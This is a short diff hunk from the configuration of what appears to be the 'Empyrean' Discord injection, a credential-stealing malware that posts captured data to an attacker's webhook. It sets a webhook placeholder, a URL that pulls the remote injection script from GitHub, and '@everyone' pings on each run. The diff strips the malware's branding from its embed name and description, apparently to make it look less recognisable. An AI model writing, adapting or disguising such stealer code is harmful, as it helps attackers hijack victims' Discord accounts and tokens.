@@ -12,10 +12,10 @@ const {
 const CONFIG = {
     webhook: "%WEBHOOK%",
     injection_url: "https://raw.githubusercontent.com/Entity378/Empyrean-Injection/main/clean.js",
-    embed_name: "Empyrean Injection",
+    embed_name: "Injection",
     embed_icon: "https://raw.githubusercontent.com/Entity378/Empyrean-Injection/main/images/avatar.png",
     embed_color: 0x2b565e,
-    embed_desc: "🦈・Empyrean Discord Injection・Made by Entity378・🦈",
+    embed_desc: "Discord injection",
     ping_on_run: true,
     ping_val: "@everyone",
 
